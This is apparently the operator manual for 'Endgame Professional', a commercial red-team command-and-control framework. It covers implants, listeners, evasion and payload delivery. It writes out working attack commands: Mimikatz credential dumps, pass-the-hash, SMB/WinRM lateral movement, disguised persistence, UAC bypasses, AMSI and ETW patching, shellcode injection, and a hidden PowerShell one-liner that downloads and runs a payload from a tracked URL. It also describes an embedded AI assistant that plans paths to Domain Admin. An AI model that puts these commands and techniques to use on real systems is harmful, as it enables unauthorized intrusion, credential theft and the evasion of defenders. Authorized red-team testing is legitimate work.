Introduction

Welcome to Endgame Professional

A full-spectrum command and control framework engineered for professional red team operations — built for operational security, team scale, and modern adversary simulation.

<>

Figure 1 — Agents panel showing active implants across multiple transports on a live engagement

Overview

Endgame Professional is a mature C2 framework designed for red teams that need deep OPSEC controls, multi-operator collaboration, and evasion capabilities that keep pace with modern EDR/XDR solutions. It ships with a built-in operator GUI, a full REST API, and a rich library of built-in techniques.

  • Listeners — server-side inbound handlers (HTTP, HTTPS, mTLS, TCP, SMB, QUIC)
  • Agents — in-memory implants deployed on target systems
  • Tasks — commands dispatched to agents and executed asynchronously
  • Operators — team members with mTLS-authenticated access to the teamserver

Quick start

Run the installer

Execute ./install.sh on your Linux C2 server. Installs dependencies, builds binaries, generates TLS certificates and first operator profile.

Connect as operator

Use c2-client -name admin, tunnel the operator port via SSH from your workstation.

Create a listener

Open Listeners → + New Listener, pick a protocol and port, and start it.

Build and deploy a payload

Open Attacks → Builder, configure transport and OPSEC options, download the compiled EXE.

Introduction

Architecture Overview

Endgame Professional is a client-server framework. The teamserver runs on a Linux VPS; operators connect from their workstations via a browser-based web UI tunneled over SSH.

Components

ComponentBinaryRole
Teamserverbin/c2-serverHandles all agent callbacks, task queuing, certificate management, operator API
Operator clientbin/c2-clientServes the web UI at a local port; connects to server over mTLS on port 31337
Agent (Go)bin/agent_*.exeWindows implant written in Go — supports HTTP, HTTPS, mTLS, QUIC, SMB, TCP
Agent (Nim)bin/agent_nim_*.exeNim agent — lightweight, alternative AV profile
Agent (C)bin/agent_c_*.exeC agent — minimal footprint

Network layout

text
Operator workstation
  ├── SSH tunnel  -L 31337:127.0.0.1:31337
  └── Browser  http://127.0.0.1:9999
            │
            ▼
         VPS (c2-server)
  ├── :31337  Operator API (loopback only, mTLS)
  ├── :80     HTTP listener
  ├── :443    HTTPS listener
  ├── :8443   mTLS listener
  ├── :4444   TCP listener
  └── :8444   QUIC/UDP listener (optional)
            │
            ▼
         Target network
  └── Agent callbacks (HTTP/S/mTLS/QUIC/SMB/TCP)
ℹ
Operator API isolation — the operator port listens on 127.0.0.1 only. It is never exposed to the internet. Access requires SSH tunnel or direct localhost access.
Getting Started

Installation

The installer handles all system dependencies, Go toolchain, certificate generation, and first operator profile creation in a single script.

Requirements

  • Debian/Ubuntu or Kali Linux (x86-64)
  • Internet access for initial dependency download
  • Root or sudo privileges
  • License key (place in data/license.key before starting the server)
ℹ
VPS recommendation — deploy the server on a cloud instance with a public IP. Operators connect via SSH tunnel to the loopback operator API port (default 31337).

Run the installer

bash
git clone git@github.com:endgamec2framework/endgameProfessional.git
cd endgameProfessional
./install.sh

The installer performs these steps automatically:

  1. Installs system packages (git, gcc, mingw, nasm, nmap, impacket, metasploit…)
  2. Installs Go ≥ 1.22, garble, nim + nimble packages
  3. Builds bin/c2-server and bin/c2-client
  4. Generates TLS certificates in certs/
  5. Creates operator profile in ~/.endgame/profiles/admin.json
  6. Downloads SharpCollection .NET tools into data/uploads/

Start the server

bash
./bin/c2-server \
  -http-port 80 -https-port 443 -mtls-port 8443 \
  -operator-port 31337 -quic-port 8444 \
  -db data/c2.db -certs certs -data data

Connect as operator

bash
# On your workstation — tunnel the operator port first
ssh -L 31337:127.0.0.1:31337 user@your-c2-server

# Then launch the GUI client
./bin/c2-client -name admin -gui-port 9999 -gui-only
# Open http://127.0.0.1:9999 in Chrome/Firefox
Getting Started

Operator Profiles

Every operator authenticates to the teamserver using a mutual-TLS client certificate stored in a JSON profile file.

Profile format

json
{
  "name":            "alice",
  "server":          "127.0.0.1:31337",
  "ca_cert_pem":     "-----BEGIN CERTIFICATE-----\n...",
  "client_cert_pem": "-----BEGIN CERTIFICATE-----\n...",
  "client_key_pem":  "-----BEGIN EC PRIVATE KEY-----\n..."
}

Profiles are stored in ~/.endgame/profiles/{name}.json with mode 0600.

Creating a new operator

bash
# On the C2 server
./bin/c2-server new-operator -name alice -port 31337

# Or via included Python script (no server restart needed)
python3 scripts/gen_operator_profile.py --name alice
⚠
Profile security — the profile contains the operator's private key. Distribute over an encrypted channel. Never commit to version control.

Regenerating after CA rotation

If the server CA changes (after a reinstall), existing profiles fail with unknown certificate authority. Regenerate:

bash
python3 scripts/gen_operator_profile.py --name admin --overwrite
Getting Started

First Launch

After the server starts and your operator profile is in place, open the client and verify connectivity.

SSH tunnel the operator port

ssh -L 31337:127.0.0.1:31337 user@your-c2-vps — keep this terminal open.

Launch the web client

./bin/c2-client -name admin -gui-port 9999 -gui-only then open http://127.0.0.1:9999 in Chrome.

Verify connection

The header shows Connected and the Agents badge shows a count. If "Connection refused" appears, check the SSH tunnel is active.

Create your first listener

Click Listeners → + New Listener and start an HTTP or HTTPS listener.

Build a test payload

Click Attacks → Builder, select transport and platform, click Build Implant.

Getting Started

Licensing

Endgame Professional requires a valid license key to start the teamserver. The license is bound to the installation and does not restrict concurrent agents or operators.

License file location

Place your license key in data/license.key before starting the server. The file contains only the license string, no headers.

Trial mode

Without a license, the server runs in trial mode: a 30-day countdown begins on first launch. Trial mode supports all features except listener persistence across restarts.

Contact REDTEAMNEW@nunsys.com to purchase a license.

Listeners

Listeners Overview

Listeners are the server-side inbound handlers that accept agent callbacks. Each listener is bound to a port and protocol. Multiple listeners can run simultaneously.

<>

Figure 2 — Listeners panel showing active HTTP, mTLS, HTTPS and TCP listeners with a Redirectors section below

Managing listeners

Navigate to Listeners in the top navigation bar. The panel shows:

  • # — listener ID (used in payload builder)
  • Type — protocol (HTTP, mTLS, HTTPS, TCP, SMB, QUIC)
  • Port — the port the listener binds to
  • Status — running / stopped
  • Started — time since start
  • Actions — ⚡ Payload (open builder pre-configured for this listener), Stop

Redirectors

The lower panel manages redirectors — external hosts that relay traffic to the teamserver. Click + Add Redirector to register a redirector with its public IP/domain, backend URL, and protocol. Agents appear in the UI tagged with the redirector they checked in through.

Listener types

TypePort defaultUse case
HTTP:8080Unencrypted; blend with web traffic via Malleable C2
HTTPS:443TLS-encrypted; no client cert required; standard egress
mTLS:8443Mutual TLS; strongest authentication; agent cert required
TCP:4444Raw TCP for internal networks or C pivot chains
SMBnamed pipePeer-to-peer pivot over named pipe; no internet required
QUIC:8444UDP/QUIC (HTTP/3); evades TCP inspection; auto fallback to HTTPS
Listeners

HTTP Listener

The HTTP listener accepts plain-text beacon traffic on port 80 (or any port). Use it behind a CDN or when HTTPS inspection is performed by the target egress proxy.

When to use HTTP

  • Target uses an SSL-inspection proxy — HTTPS beacons would be terminated and re-signed by a corporate CA. HTTP avoids this.
  • Combined with a Malleable C2 profile, HTTP traffic looks like legitimate web browsing.
  • Useful for initial access from untrusted networks where the TLS handshake itself triggers inspection.
⚠
No confidentiality — HTTP beacon traffic is unencrypted at the transport layer. The payload body is AES-encrypted at the application layer, but metadata (source IP, timing, URIs) is visible. Prefer HTTPS or mTLS when possible.

Configuration

OptionDefaultDescription
Port8080TCP port to bind
Bind address0.0.0.0Interface to listen on
Malleable profilenoneOverride HTTP headers, URIs, user-agent
Listeners

HTTPS Listener

The HTTPS listener wraps beacon traffic in TLS 1.3. No client certificate is required — any agent can check in. This is the standard listener for most engagements.

Certificate

By default the server uses a self-signed TLS certificate generated during installation. For production use, replace certs/server.crt and certs/server.key with a Let's Encrypt certificate for your C2 domain. Agents embed the CA cert at build time so they can verify the server identity.

vs. mTLS

Unlike mTLS, HTTPS does not require the agent to present a certificate. This is a trade-off: easier deployment but no server-side agent authentication. Use mTLS for high-value targets or when agent attribution is important.

Listeners

mTLS Listener

Mutual TLS — both server and agent present certificates signed by the same CA. The server rejects any connection from an unrecognized client certificate, providing strong agent authentication.

How it works

  1. During install, a CA keypair is generated in certs/
  2. The server TLS cert is signed by this CA
  3. At payload build time, the builder generates a unique client cert+key signed by the same CA and bakes them into the agent binary
  4. On each beacon, the agent presents its client cert; the server verifies it against the CA
✓
Best choice for sensitive ops — mTLS provides the strongest binding between agent identity and the teamserver. Even if the beacon URL is leaked, no unauthorized agent can check in without a valid client cert.
Listeners

TCP Listener

Raw TCP listener — used by C agents and for internal network pivots where HTTP is not available.

The C agent (agent_https_c.exe) can be built to beacon over raw TCP to the teamserver. This bypasses HTTP proxies entirely and is useful for air-gapped segments reachable via port-forward.

Port forwarding

bash
# Forward internal host's TCP/4444 to teamserver
ssh -R 4444:127.0.0.1:4444 user@internal-pivot
Listeners

SMB Named Pipe Listener

The SMB listener uses Windows named pipes as the transport. Agents communicate peer-to-peer over SMB without touching the internet.

Use case

When a target host cannot reach the internet directly, deploy an SMB agent that connects to an existing agent acting as a relay. The relay agent forwards SMB traffic to the teamserver over its own HTTPS/mTLS connection.

Deployment pattern

text
Internet-connected host (agent A, HTTPS)
    │ SMB named pipe  \\TARGET\pipe\svc
    ▼
Air-gapped host (agent B, SMB)  →  relayed via A  →  C2

To link an SMB agent to a parent: right-click the parent agent in the console and select Link SMB Agent, then provide the named pipe path.

Listeners

QUIC / HTTP3 Listener NEW

The QUIC listener transports beacon traffic over UDP/QUIC (HTTP/3), bypassing TCP-based network inspection and evading many IDS/proxy solutions.

Why QUIC

  • Runs over UDP — most corporate IDS/NGFW only inspect TCP
  • TLS 1.3 mandatory inside QUIC — no cleartext inspection
  • UDP/443 is often allowed as "video streaming" (YouTube, Google Meet)
  • 1-RTT connection establishment vs 3-RTT for TCP+TLS

Automatic HTTPS fallback

After 3 consecutive UDP failures the agent automatically switches to HTTPS and continues beaconing. The UI shows QUIC→HTTPS in the transport column.

Start a QUIC listener

bash
./bin/c2-server -quic-port 8444 ...

Agents & Payloads

Go Agent (Windows)

The Go agent is the primary Windows implant — feature-complete, supports all transports, and compiles to a standalone EXE with no external dependencies.

Supported transports

  • HTTPS — default, TLS 1.3
  • HTTP — plain-text, useful behind SSL-inspection proxies
  • mTLS — mutual TLS with embedded client cert
  • QUIC — UDP/HTTP3 with automatic HTTPS fallback
  • TCP — raw TCP for internal pivot
  • SMB — named pipe peer-to-peer

Build variants

Process name patternDescription
agent_https_go.exeGo agent, HTTPS transport
agent_mtls_go.exeGo agent, mTLS transport
agent_mtls_v2.exeGo agent, mTLS v2 (newer beacon format)
svc_quic2.exeGo agent, QUIC with HTTPS fallback
implant.exeCustom output filename (set in Builder)

Key capabilities

  • In-process BOF execution (COFF x64, CS-compatible API)
  • UDC2 hot-swap transport at runtime
  • Sleep mask (heap encryption during sleep)
  • SOCKS5 proxy
  • Port scan, process list, file ops, shell, PowerShell (AMSI-patched)
  • Token manipulation (GetSystem, impersonation)
  • SMB/WinRM/RDP lateral movement
  • DCSync, hashdump, Kerberoast
Agents & Payloads

Nim Agent (Windows)

The Nim agent is a lightweight Windows implant with a small compiled binary size and a different AV/EDR detection profile from the Go agent.

Use case

When the Go agent is flagged by EDR signatures, deploy the Nim agent as an alternative. Nim compiles to native Windows PE with a different code pattern than Go's runtime.

Supported transports

  • HTTP, HTTPS

Limitations vs Go agent

  • No BOF execution
  • No UDC2 transport
  • Limited post-exploitation (shell, file ops, basic recon)

Build with Nim agent selected in the Builder's Agent Language segmented control.

Agents & Payloads

Agent Lifecycle

Understanding how agents register, beacon, and die helps you maintain operational awareness and clean up stale entries.

Registration

On first beacon, the agent sends a registration packet containing hostname, username, OS, PID, process name, and transport. The server assigns a unique 8-hex-char ID and stores the agent in the database.

Beacon cycle

Each beacon cycle the agent: (1) connects to the C2 listener, (2) sends any pending output, (3) receives a task list (may be empty), (4) ACKs the tasks, (5) sleeps for sleep ± jitter% seconds, then repeats.

Dead agents

An agent is marked Dead when its Next beacon time is more than 3× the sleep interval in the past. Dead agents remain in the database and can be interacted with in case they come back online. Click Purge dead to delete all dead agents.

Kill

The Kill task terminates the agent process and marks it dead. The agent will not restart unless it was installed as a service or scheduled task.

Command Reference

Commands are issued from the per-agent console. Each console maintains a full output history and supports autocomplete, language switching (EN/ES), and task queuing.

<>

Opening a console

Click the Console button on any agent row in the Agents table. The console splits the screen — the upper half remains the agents table, the lower half is the interactive console for that agent.

Console anatomy

  • Tab bar — one tab per open agent console; click × to close
  • Output area — scrolling log of all task outputs with timestamps

Built-in help

console
1eb64181 » help          # full command list
1eb64181 » shell /?       # help for shell command

Task queue

Tasks are queued server-side and delivered on the next beacon. The badge on the agent row shows the pending task count. Large or async tasks (BOFs, uploads) show a spinner until complete.

Commands

Shell & PowerShell

Execute arbitrary shell commands or PowerShell expressions on the target.

Shell (cmd.exe)

console
shell whoami /all
shell net user
shell ipconfig /all
shell netstat -ano

PowerShell

console
powershell Get-Process
powershell Invoke-Mimikatz -Command '"sekurlsa::logonpasswords"'
powershell [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
✓
AMSI bypass — the powershell command patches AMSI in the spawned PowerShell process before executing the expression. This bypasses real-time AMSI scanning for the current session.

Task JSON

json
{"type":"SHELL","args":{"cmd":"whoami /all"}}
{"type":"POWERSHELL","args":{"expr":"Get-Process | Select-Object Name,Id"}}

Commands

Process & Injection

Enumerate processes, inject shellcode into remote processes, migrate the agent, and spawn new sessions.

Process enumeration

console
ps                          # list all processes
ps | grep lsass             # filter by name
kill <pid>                  # terminate a process

Right-clicking a process row in the console shows quick actions: Inject, Migrate, Kill.

Injection

Task typeDescription
INJECTInject shellcode into a remote PID. Method: CreateRemoteThread (default), NtQueueApcThread, or EarlyBird APC.
INJECT_OBFSTCObfSetThreadContext injection — sets thread context to shellcode without CreateRemoteThread. EDR-evasive.
SPAWNSpawn a new agent process (sacrificial). Inherits parent's transport.
MIGRATEMigrate the agent into another existing process. The old PID is abandoned.
json
{"type":"INJECT","args":{"pid":1234,"method":"APC"},"payload_b64":"<shellcode b64>"}
{"type":"MIGRATE","args":{"pid":5678}}
Commands

Lateral Movement

Move between hosts using credentials or tokens obtained during the engagement.

SMB exec (PsExec-style)

console
lateral smb TARGET_HOST DOMAIN\Administrator P@ss1! /payload:C:\Windows\Temp\svc.exe

Copies the payload to the target via SMB and executes it using the service control manager.

WinRM exec

console
lateral winrm TARGET_HOST DOMAIN\Administrator P@ss1! /cmd:"cmd /c C:\Temp\svc.exe"

Pentest Cradles (GUI)

For GUI-driven lateral movement with credential management, use Pentest → Internal Pentest Cradles. Enter loot creds, select the target IP, choose a payload, and click Upload+Exec. See the Pentest Cradles section.

Pass-the-Hash

console
pth DOMAIN\Administrator aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c /cmd:"cmd /c ..."

Over-pass-the-Hash / Token impersonation

console
impersonate <pid>           # steal token from process
rev2self                    # drop impersonation token

Task JSON

json
{"type":"LATERAL_SMB","args":{"host":"10.10.10.5","user":"DOMAIN\\Admin","pass":"P@ss","payload":"C:\\Temp\\svc.exe"}}
{"type":"LATERAL_WINRM","args":{"host":"10.10.10.5","user":"DOMAIN\\Admin","pass":"P@ss","cmd":"powershell -enc ..."}}
Commands

Persistence

Establish persistence so the agent survives reboots and logoffs.

Registry run key

console
persist run HKCU C:\Windows\Temp\svc.exe "Security Update"
persist run HKLM C:\Windows\Temp\svc.exe "Security Update"

Scheduled task

console
persist schtask "SecurityUpdate" C:\Windows\Temp\svc.exe SYSTEM DAILY
persist schtask "SecurityUpdate" C:\Windows\Temp\svc.exe INTERACTIVE_LOGON

Windows service

console
persist service "SecuritySvc" C:\Windows\Temp\svc.exe

WMI event subscription

console
persist wmi "SecurityFilter" C:\Windows\Temp\svc.exe
⚠
OPSEC note — registry run keys and scheduled tasks are easily detected. Prefer WMI subscriptions or COM hijacking for stealthier persistence. Always clean up after the engagement.
Commands

Privilege Escalation

Escalate from a low-privileged user to SYSTEM or local Administrator.

GetSystem (named pipe impersonation)

console
getsystem          # tries all methods automatically
getsystem pipe     # named pipe impersonation
getsystem token    # token duplication from SYSTEM service

The GETSYSTEM task tries named-pipe impersonation, token duplication, and CreateProcess as SYSTEM in sequence until one succeeds.

UAC bypass

console
uac bypass fodhelper C:\Windows\Temp\svc.exe
uac bypass eventvwr C:\Windows\Temp\svc.exe

Token manipulation

console
tokens               # list available tokens
impersonate <pid>    # steal token from high-priv process
maketoken DOMAIN\Admin P@ss1!   # create token with credentials
rev2self             # revert to original token

Task JSON

json
{"type":"GETSYSTEM","args":{}}
{"type":"UAC_BYPASS","args":{"method":"fodhelper","payload":"C:\\Windows\\Temp\\svc.exe"}}
Evasion & OPSEC

Evasion Overview

Endgame Professional includes layered evasion techniques that can be combined at build time and runtime to defeat EDR, AV, and network inspection.

Defense layers

LayerTechniqueWhere configured
Static AVObfuscation pipeline (SGN, XOR, AES), Garble, entropy paddingPayload Builder
Behavioral EDRSleep mask (heap encryption), ObfSetThreadContext injection, stack spoofingBuilder → Advanced OPSEC
ETW telemetryETW patch (NtTraceEvent hook), provider deregistrationBuilder → Advanced OPSEC
AMSIAMSI patch (AmsiScanBuffer hook), AMSI bypass in powershell tasksBuilder + runtime
Network inspectionHTTPS/mTLS encryption, QUIC UDP transport, Malleable C2 profilesListener + Builder
BOF detectionBOFs run in-process (no new process), shellcode freed after executionBOF system
Evasion & OPSEC

Sleep Mask

During the sleep interval the agent encrypts its own heap to defeat in-memory scanning. AV/EDR that scans live process memory during idle time will not find recognizable beacon artifacts.

How it works

  1. Before sleeping, the agent walks its heap using VirtualQuery and encrypts each committed private region with AES-128
  2. The sleep timer fires in a code cave that cannot be scanned as shellcode
  3. On wake, the agent decrypts the heap in reverse order and resumes execution
✓
CS 4.11 parity — the Endgame sleep mask achieves feature parity with Cobalt Strike 4.11's full heap sleepmask including VirtualQuery loop and stack spoofing during sleep.

Enable at build time

In Payload Builder → Advanced OPSEC, check Sleep Mask. Adds ~4KB to the compiled binary.

Evasion & OPSEC

Injection Methods

Multiple injection techniques are available to suit the target EDR's detection profile.

MethodTask typeDescription
CreateRemoteThreadINJECTClassic injection — detected by most EDRs. Use for test purposes only.
NtQueueApcThreadINJECT (method=APC)Queue APC to a thread in the target process. Less noisy than CRT.
EarlyBird APCINJECT (method=EARLYBIRD)Inject before process main executes. Spawns a sacrificial process.
ObfSetThreadContextINJECT_OBFSTCSet thread context to shellcode without CRT or APC. Evades many behavioral rules.
Evasion & OPSEC

ETW Bypass

Event Tracing for Windows (ETW) is Microsoft's telemetry infrastructure. Endgame can patch the ETW provider in the agent's process to suppress telemetry sent to EDR solutions that consume ETW events.

Technique

The agent patches ntdll!EtwEventWrite with a ret stub, causing all ETW events from the process to be silently discarded before reaching any registered consumer (including Windows Defender, Sysmon, and commercial EDR ETW consumers).

Enable

Payload Builder → Advanced OPSEC → check Patch ETW. The patch is applied at agent startup before any beacon cycle.

⚠
Detection risk — ETW patching is itself a detectable behavior. Some EDRs hook EtwEventWrite and alert when it is overwritten. The ObfSetThreadContext injection (INJECT_OBFSTC) avoids this by using a less-monitored code path.
Evasion & OPSEC

AMSI Bypass

AMSI (Antimalware Scan Interface) intercepts PowerShell, JScript, VBScript and .NET assembly loading. Endgame patches AMSI in the agent process so PowerShell tasks run without AMSI scanning.

Runtime patch

The POWERSHELL task automatically patches amsi.dll!AmsiScanBuffer with a stub that always returns AMSI_RESULT_CLEAN before executing the expression. No manual bypass is required.

Build-time option

Enable Patch AMSI in Advanced OPSEC to apply the patch at agent startup, before any PowerShell is loaded.

ℹ
Scope — the AMSI patch only affects the current process. Child processes spawned after the patch inherit a fresh AMSI state unless they also apply the patch.
Evasion & OPSEC

Obfuscation Pipeline

An ordered chain of encoding transforms applied to the shellcode at build time. The agent runs the transforms in reverse to recover the original shellcode at runtime.

Available transforms

TransformDescription
SGNShikata Ga Nai — x64 polymorphic XOR encoder. Changes the byte pattern on each build.
XORSingle-byte XOR with a random key. Fast, adds minimal stub.
ZLIBCompress the payload. Reduces entropy on highly repetitive shellcode.
B64Base64 encode. Defeats signatures looking for raw binary patterns.
AESAES-256-CBC encryption with a random key embedded in the loader stub.

Configuration

In Payload Builder → Shellcode Encryption, select the desired transform. The default is None. For maximum evasion, use AES (applied last in the chain, decrypted first at runtime).

BOF

Beacon Object Files

BOFs are COFF x64 object files that execute in the agent's process context with direct access to the Windows API — no injection, no new process.

How BOFs work

  1. The agent receives a BOF_RUN task with the COFF bytes as base64 payload
  2. Copies the COFF into a new RWX memory region
  3. Resolves import symbols against the process's loaded modules
  4. Calls the exported go(char *args, int argslen) function
  5. Captures BeaconOutput() calls and sends them back as task output
  6. Frees the memory region and returns
✓
CS compatibility — Endgame BOFs are compatible with the Cobalt Strike BOF API. Any BOF written for CS 4.x will run unmodified, including beacon.h helper macros.
BOF

Installing BOFs

BOFs are managed through the operator client — not the server. Install once; available to all operators.

Method 1 — Console CLI

console
bof install /opt/bofs/nanodump.o
bof list                            # show installed BOFs
bof run nanodump 1234               # run with PID argument

Method 2 — Settings UI

Open Operator ▾ → Settings → 💾 BOFs → Catalog tab. Drag and drop one or more .o files onto the upload area, or click Upload. The installed tab shows all available BOFs with their signatures (argument types).

BOF

Running BOFs

Run a BOF against a specific agent from the console or task API.

console
bof run whoami                          # no arguments
bof run nanodump 1234                   # pid argument (int)
bof run seatbelt -GroupsV2 -Tokens     # string arguments
bof run async nanodump 1234            # async — ACK immediate

Task JSON

json
{"type":"BOF_RUN","args":{"name":"whoami"},"payload_b64":"<coff b64>"}
{"type":"BOF_RUN_ASYNC","args":{"name":"nanodump","args":"1234"},"payload_b64":"<coff b64>"}
BOF

Writing BOFs

Write a BOF using any C compiler that targets COFF x64. The Endgame BOF API is identical to Cobalt Strike's.

c
#include "beacon.h"

void go(char *args, int alen) {
    BeaconPrintf(CALLBACK_OUTPUT, "Hello from BOF!\n");
    
    // Parse args using datap helpers
    datap parser;
    BeaconDataParse(&parser, args, alen);
    int pid = BeaconDataInt(&parser);
    
    BeaconPrintf(CALLBACK_OUTPUT, "Target PID: %d\n", pid);
}

Compile

bash
# Linux cross-compile for Windows x64
x86_64-w64-mingw32-gcc -c mybof.c -o mybof.o

# Windows (MSVC)
cl.exe /c mybof.c /Fo:mybof.obj
BOF

Async BOF Execution

Long-running BOFs block the beacon loop. Use BOF_RUN_ASYNC to run a BOF in a background goroutine — the agent ACKs the task immediately and sends results when the BOF finishes.

When to use async

  • LSASS dumps (nanodump, procdump) — can take 10–30 seconds
  • Port scans (portsweep)
  • Any BOF that makes network connections or does heavy I/O

Usage

console
bof run async nanodump 1234
# immediately returns: [+] Async BOF queued: nanodump
# agent beacons normally while nanodump runs
# result arrives in next beacon cycle that completes the BOF
Covert Channels

UDC2 — User-Defined C2 Transport

Replace the agent's built-in HTTP transport at runtime with a custom BOF that delivers beacon data over any channel — DNS, ICMP, Slack, named pipes, or anything you can write in C.

How it works

  1. Deliver a UDC2_LOAD task with a COFF implementing the udc2RoundTripper interface
  2. The agent replaces its internal HTTP client with the BOF's transport
  3. On every beacon cycle, the agent calls go() in the BOF, passing the encrypted beacon body as argument
  4. The BOF sends the data over its custom channel and returns the server response via BeaconOutput
  5. The agent decrypts the response normally — the custom transport is fully transparent to the upper layers
console
udc2 load /opt/udc2/dns_transport.o
# [+] UDC2 transport loaded — 7432 bytes
# agent now beacons via DNS TXT queries

Writing a UDC2 transport

Implement go(char *args, int alen). The args are the raw encrypted beacon body. Write the server response back with BeaconOutput(CALLBACK_OUTPUT, resp, resplen). See agents/agent-go/transport_quic_windows.go for a reference implementation.

Covert Channels

QUIC & Automatic Fallback NEW

QUIC/HTTP3 is the newest transport — UDP-based, TLS 1.3, with automatic fallback to HTTPS if UDP is blocked.

Fallback mechanism

The quicWithFallback transport wrapper in the agent counts consecutive network-level errors. After 3 failures, it permanently switches to the configured HTTPS fallback URL and sets Transport="quic→https" which appears as a QUIC→HTTPS badge in the UI.

Build configuration

Build varDescription
QUICServerURLPrimary QUIC endpoint, e.g. https://host:8444
QUICFallbackURLHTTPS fallback URL. Defaults to ServerURL if not set.

Both are automatically populated by the Payload Builder when QUIC transport is selected.

Covert Channels

SMB Pivot

Route an agent's beacon traffic through another agent via SMB named pipe — useful for hosts without direct internet access.

Deployment

  1. Deploy an internet-connected agent (parent) on a host that can reach the C2 server
  2. From the parent's console, deploy an SMB payload to the air-gapped host:
    console
    lateral smb TARGET C:\Temp\smb_agent.exe
  3. Link the child agent to the parent:
    console
    link \\TARGET\pipe\svc_12345
  4. The child agent appears in the Agents panel with SMB transport tag and a child relationship line in Graph view.
Covert Channels

Malleable C2

Override the HTTP request profile of running agents — change user-agent, beacon URIs, request headers, and HTTP method — without redeployment.

Profile fields

FieldDescription
user_agentHTTP User-Agent header sent by the agent
beacon_uriURI path for beacon requests (e.g. /jquery-3.6.min.js)
host_headerHost header for domain-fronting
extra_headersAdditional HTTP headers to include
methodHTTP method (GET or POST)

Push live update

console
profile set user_agent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
profile set beacon_uri "/api/v2/auth/refresh"
profile push          # delivers CONFIG task to agent

API

bash
curl -s --cert op.crt --key op.key https://127.0.0.1:31337/api/agents/1eb64181/push-profile \
  -d '{"user_agent":"Mozilla/5.0 ...","beacon_uri":"/api/auth/refresh"}'
Attack & Delivery

Scripted Delivery

Generate a delivery script from a staged payload URL, host it on the web server, and produce the one-liner the victim needs to run — with real-time hit tracking.

<>

Figure 6 — Scripted Delivery panel showing the payload URL, script URI, and generated PowerShell one-liner

Workflow

Build and stage the payload

Use the Payload Builder to build a Loader or Stager. The staged URL is automatically filled in from the first active HTTP listener.

Configure the script

Set the Payload URL (staged .bin or loader URL), Script URI (path under which the script is hosted, e.g. /jquery-3.6.min.js), Script Host and Port.

Select script type

Choose PowerShell (default), VBScript, JScript, HTA, or Bash. Toggle SSL/HTTPS delivery.

Click Generate & Host

The server hosts the script at the chosen URI. The delivery one-liner is shown and can be copied. Send this to the target.

Monitor hits

Every time a victim fetches the script, the hit counter increments. Click the green ▸ N hits badge to see the full hit log (timestamp, IP, User-Agent).

Generated one-liner examples

powershell
powershell -nop -ep bypass -w hidden -c "IEX((New-Object Net.WebClient).DownloadString('http://<host>:80/jquery-3.6.min.js'))"
Attack & Delivery

Pentest Cradles

Automated internal pentest with stored credentials — validate access, dump hashes, enumerate, spray passwords, and deploy agents in one click.

<>

Figure 7 — Pentest Cradles panel showing credential fields, target configuration, and execution tabs

Tabs

TabFunction
ValidateCheck if the credentials give access to the target via SMB, WinRM, RDP, MSSQL, or SSH

netexecRun an arbitrary netexec command against the target

Loot credentials

The Loot Creds dropdown is populated automatically from credentials captured during the engagement (hashdump, DCSync, Kerberoast). Select a credential set and all fields auto-fill.

Auto execution modes

  • smbclient + wmiexec — copy payload via SMB, execute via WMI (default)
  • impacket psexec — PsExec-style via SMB service
  • winrm — PowerShell remoting via WinRM
  • ssh — SSH command execution
Attack & Delivery

Peer Federation

Link multiple Endgame teamservers into a federated view. Agents from peer servers appear in your UI with a 🔗 peer badge, and credentials are shared across the federation.

Adding a peer

bash
curl --cert op.crt --key op.key https://127.0.0.1:31337/api/peers \
  -d '{"url":"https://peer2.example.com:31337","token":"peer_api_token"}'

Or in the UI: Operator ▾ → Peers → + Add Peer.

Sync behavior

  • Agent lists sync every 30 seconds
  • Credential store is merged across all peers
  • Tasks issued to peer agents are proxied to the peer server's API
  • Peer agents are read-only in your UI (you can issue tasks but cannot modify their configuration)
Attack & Delivery

Reporting

Export engagement data — agent list, task history, captured credentials, and scripted delivery hits — for inclusion in pentest reports.

Exporting data

All data is available via the Operator API. Use the API to query:

  • GET /api/agents — full agent list with metadata
  • GET /api/agents/{id}/tasks — complete task history for an agent
  • GET /api/credentials — all captured credentials
  • GET /api/hosted/{id}/hits — scripted delivery hit log
bash
# Export all agents as JSON
curl --cert op.crt --key op.key https://127.0.0.1:31337/api/agents | jq .

# Export credentials
curl --cert op.crt --key op.key https://127.0.0.1:31337/api/credentials | jq .
Tools

AI Assistant

An integrated AI chat panel powered by a local Ollama model. Inject the current C2 state (agent list, credentials, network topology) and ask the model for attack paths, OPSEC advice, or lateral movement suggestions.

<>

Figure 8 — AI Assistant panel connected to Ollama with C2 context injection and quick-prompt buttons

Setup

  1. Install Ollama on the operator workstation: curl -fsSL https://ollama.com/install.sh | sh
  2. Pull a model: ollama pull qwen2.5:7b or ollama pull llama3.2
  3. In the AI panel, set the Ollama URL (http://localhost:11434) and select the model
  4. Click C2 context to inject the current agent state before asking a question

Quick prompts

The bottom bar shows pre-built quick prompts:

  • All Agents Status — summary of all agents and their health
  • Lateral Move Paths — suggest lateral movement paths based on current agents
  • Cred → Host Mapping — map captured credentials to reachable hosts
  • Best Attack Path — recommend next steps toward the objective
  • Domain Admin Path — suggest the shortest path to Domain Admin
  • OPSEC Review — analyze current ops for detection risk
ℹ
Privacy — all AI inference runs locally via Ollama. No data is sent to external APIs unless you configure a remote provider.

Pentest mode

Toggle the Pentest tab in the AI panel for a structured pentest-report mode — the model outputs findings in a structured format suitable for copy-paste into reports.

Reference

Operator API

The teamserver exposes a REST API over mTLS at port 31337. All responses are wrapped in {"data":…,"ok":true}. Authentication requires a valid operator client certificate.

Core endpoints

MethodPathDescription
GET/api/agentsList all agents (includes peer agents)
GET/api/agents/{id}Single agent detail
POST/api/agents/{id}/tasksQueue a task
POST/api/agents/{id}/push-profilePush a Malleable C2 profile update
GET/api/listenersList listeners
POST/api/listenersCreate a listener
DELETE/api/listeners/{id}Stop a listener
GET/api/credentialsCaptured credentials (merged with peers)
GET/api/peersList peer servers
POST/api/peersAdd a peer server
POST/api/buildBuild a payload (returns binary stream)
GET/api/hosted/{id}/hitsScripted delivery hit log

Task payload format

json
{
  "type":        "SHELL",
  "args":        {"cmd": "whoami /all"},
  "payload_b64": null
}

cURL example

bash
# Issue a shell task to agent 1eb64181
curl -s --cert ~/.endgame/profiles/admin.crt --key ~/.endgame/profiles/admin.key \
  https://127.0.0.1:31337/api/agents/1eb64181/tasks \
  -H "Content-Type: application/json" \
  -d '{"type":"SHELL","args":{"cmd":"whoami"}}'
